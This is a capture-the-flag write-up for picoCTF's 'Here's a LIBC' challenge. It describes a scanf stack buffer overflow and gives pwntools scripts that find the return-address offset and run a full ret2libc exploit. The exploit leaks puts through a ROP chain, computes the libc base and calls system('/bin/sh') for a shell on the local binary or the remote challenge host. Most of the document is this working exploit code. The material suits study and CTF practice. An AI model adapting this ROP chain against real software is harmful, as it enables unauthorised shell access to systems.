## Writeup - Here's a LIBC

Vulnerability:
First, open up the vuln binary with Ghidra to see the decomplied C code. If you look at the `main` function there is a `while`-loop that calls a function `do_stuff`. Inside this function there is a variable of size 112 but it's contents are read through `scanf`. This is a buffer-overflow. The idea now is to write a more than 112 bytes as input and then some code so that we can run that code. That code will essentially pop a shell with `/bin/sh`.


Exploit:
We first try to find how many characters to fill before the malicious code.

Script to find offset:
```python
from pwn import *

io = process("./vuln")
print(io.recvregex(b'!')) # read until we get the prompt
io.sendline(cyclic(500))
io.wait()
core = io.corefile
rsp = core.rsp
info("rsp = %#x", rsp)
pattern = core.read(rsp, 4)
rip_offset = cyclic_find(pattern)
info("rip offset is %d", rip_offset)
```

Full exploit:
```python
import sys

from pwn import *

libcelf = {
  "local": "/lib/x86_64-linux-gnu/libc.so.6",
  "remote": "./libc.so.6"
}

mode = sys.argv[1]
print(f"mode: {mode}")
if mode != "local" and mode != "remote": print("exitting.."); sys.exit()

vuln_elf = ELF("./vuln")
r = vuln_elf.process() if mode == "local" else remote("mercury.picoctf.net", sys.argv[2])

libc = ELF(libcelf[mode])

pop_rdi = 0x0000000000400913
ret = 0x000000000040052e

puts_plt = vuln_elf.plt['puts'] #grab plt address of puts function
main_plt = vuln_elf.symbols['main'] #grab address of main
puts_got = vuln_elf.got['puts']

junk = b"A" * 136

log.info(f"main starts @ {hex(main_plt)}")
log.info(f"puts plt @ {hex(puts_plt)}")
log.info(f"pop rdi; ret @ {hex(pop_rdi)}")
log.info(f"puts got @ {hex(puts_got)}")

rop1 = b""
rop1 += junk
rop1 += p64(pop_rdi) #fill rip with pop rdi; ret address
rop1 += p64(puts_got) #put address of puts global offset table in the rdi register
rop1 += p64(puts_plt) #call to puts in the procedural link table, looks to rdi for argument (puts_got)
rop1 += p64(main_plt) #return to main of program after tricking it into leaking puts address

print(r.clean()) #clean buffer and print all received bytes
r.sendline(rop1)

print(r.recvline())

received_line = r.recvline().strip()
leak = u64(received_line.ljust(8, b"\x00"))
log.info(f"leaked puts address @ {hex(leak)}")

libc.address = leak - libc.symbols['puts']
log.info(f"libc base @ {hex(libc.address)}")
log.info("now we have libc base, we can find system and pwn that sh*t")

bin_sh = next(libc.search(b"/bin/sh"))
system = libc.symbols['system']

log.info(f"/bin/sh located @ {hex(bin_sh)}")
log.info(f"system function located @ {hex(system)}")

rop2 = b""
rop2 += junk
rop2 += p64(ret)
rop2 += p64(pop_rdi) #Once again, pop rdi to place argument in
rop2 += p64(bin_sh) #put /bin/sh into rdi to be passed to system
rop2 += p64(system) #call system with /bin/sh argument from rdi

r.clean()
r.sendline(rop2)
r.interactive()
```

